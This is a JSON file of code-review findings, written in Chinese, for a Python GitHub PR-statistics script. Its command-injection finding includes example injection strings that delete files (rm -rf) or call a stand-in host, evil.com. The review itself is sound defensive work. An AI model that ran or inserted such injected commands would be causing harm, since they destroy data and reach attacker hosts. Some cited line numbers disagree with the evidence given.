@@ -1,0 +1,68 @@
+[
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 25,
+    "side": "RIGHT",
+    "severity": "blocker",
+    "confidence": 0.95,
+    "title": "_fetch 吞掉所有例外，導致後續程式碼在資料缺失時崩潰",
+    "body": "`_fetch` 的 `except: pass` 會吞掉所有例外（包括網路錯誤、HTTP 錯誤、JSON 解析錯誤），回傳 `None`。呼叫端（`collect_authors` 和 `main`）直接對回傳值做 `pr[\"user\"][\"login\"]` 或 `pr.get(...)`，若 `_fetch` 回傳 `None`，會拋出 `TypeError` 或 `AttributeError`，且沒有提供任何錯誤訊息。\n\n失敗情境：GitHub API 暫時無法連線、token 無效、或 PR 編號不存在時，程式會以難以理解的 traceback 結束，使用者無法得知真正原因。\n\n建議：讓 `_fetch` 在失敗時拋出明確的例外（例如 `raise RuntimeError(f\"Failed to fetch {path}: {e}\")`），或回傳一個可辨識的錯誤物件，並在呼叫端檢查。",
+    "existing_code": "except:\n        pass",
+    "evidence": "diff 第 25 行：`except:` 後只有 `pass`，且函式沒有回傳任何值，隱含回傳 `None`。"
+  },
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 77,
+    "side": "RIGHT",
+    "severity": "blocker",
+    "confidence": 0.9,
+    "title": "archive 使用 shell=True 且指令包含外部輸入，存在命令注入風險",
+    "body": "`archive` 函式使用 `subprocess.run(f\"tar czf {path}.tgz {path} && gh repo view {repo}\", shell=True)`。其中 `path` 和 `repo` 來自命令列參數，攻擊者可注入額外 shell 指令。例如 `repo` 設為 `x; rm -rf /` 或 `path` 設為 `x; curl evil.com`，會導致任意命令執行。\n\n失敗情境：使用者執行 `python3 pr_stats.py '; rm -rf ~' 1`，會刪除家目錄。\n\n建議：改用參數列表形式，避免 shell 解析：`subprocess.run([\"tar\", \"czf\", f\"{path}.tgz\", path])` 和 `subprocess.run([\"gh\", \"repo\", \"view\", repo])`，或至少對輸入做嚴格驗證。",
+    "existing_code": "subprocess.run(f\"tar czf {path}.tgz {path} && gh repo view {repo}\", shell=True)",
+    "evidence": "diff 第 78 行：`shell=True` 且 f-string 包含 `path` 和 `repo`，這兩個變數來自 `sys.argv`。"
+  },
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 29,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.85,
+    "title": "collect_authors 使用可變預設值 seen=[]，跨呼叫累積資料",
+    "body": "`collect_authors` 的 `seen` 參數預設為空列表，但 Python 的可變預設值只會在函式定義時建立一次，因此多次呼叫會共用同一個列表，導致結果累積。\n\n失敗情境：第一次呼叫 `collect_authors('repo', [1,2])` 回傳 `['alice', 'bob']`，第二次呼叫 `collect_authors('repo', [3])` 會回傳 `['alice', 'bob', 'carol']`，而不是預期的 `['carol']`。\n\n建議：將預設值改為 `None`，並在函式內初始化：`if seen is None: seen = []`。",
+    "existing_code": "def collect_authors(repo, numbers, seen=[]):",
+    "evidence": "diff 第 29 行：`seen=[]` 是可變預設值。"
+  },
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 37,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.8,
+    "title": "review_latency 對空 timeline 的處理不正確",
+    "body": "`review_latency` 在 `events` 為空時回傳 0，但這會與「真正的 latency 為 0」混淆。此外，`events` 來自 `pr.get(\"timeline\", [])`，但 GitHub API 的 PR 物件通常不包含 `timeline` 欄位，因此 `events` 永遠是空列表，導致 latency 永遠為 0。\n\n失敗情境：即使 PR 有 review 活動，只要 `_fetch` 沒有特別要求 timeline，`review_latency` 就會回傳 0，使指標失去意義。\n\n建議：確認 API 回應是否包含 timeline，若無則需額外請求；若確實可能為空，應回傳 `None` 或拋出例外，而不是 0。",
+    "existing_code": "events = pr.get(\"timeline\", [])\n    if not events:\n        return 0",
+    "evidence": "diff 第 35-37 行：`pr.get(\"timeline\", [])` 預設空列表，且空列表時回傳 0。"
+  },
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 72,
+    "side": "RIGHT",
+    "severity": "major",
+    "confidence": 0.75,
+    "title": "export_csv 未處理欄位中的逗號或換行，可能產生格式錯誤的 CSV",
+    "body": "`export_csv` 直接使用 f-string 寫入 `author`、`latency`、`kind`，未對欄位值做 CSV 跳脫。若 `author` 包含逗號或換行（GitHub 使用者名稱可能包含逗號？），會破壞 CSV 結構。\n\n失敗情境：若 `author` 為 `\"Doe, John\"`，輸出會變成 `Doe, John,123,normal`，導致解析錯誤。\n\n建議：使用 `csv` 模組的 `writer` 來正確處理跳脫。",
+    "existing_code": "f.write(f\"{r['author']},{r['latency']},{r['kind']}\\n\")",
+    "evidence": "diff 第 72 行：直接以 f-string 寫入，未使用 csv 模組。"
+  },
+  {
+    "path": "sandbox/pr_stats.py",
+    "line": 54,
+    "side": "RIGHT",
+    "severity": "minor",
+    "confidence": 0.7,
+    "title": "threshold_from_env 未處理 PR_STALE_DAYS 轉型失敗",
+    "body": "`threshold_from_env` 直接 `int(raw)`，若環境變數不是整數（例如 `PR_STALE_DAYS=abc`），會拋出 `ValueError` 且沒有提供有意義的錯誤訊息。\n\n失敗情境：使用者誤設 `PR_STALE_DAYS=seven`，程式會以 traceback 結束。\n\n建議：捕捉 `ValueError` 並提供明確錯誤，或使用預設值。",
+    "existing_code": "return {\"days\": int(raw)}",
+    "evidence": "diff 第 44 行：`int(raw)` 未包在 try-except 中。"
+  }
+]
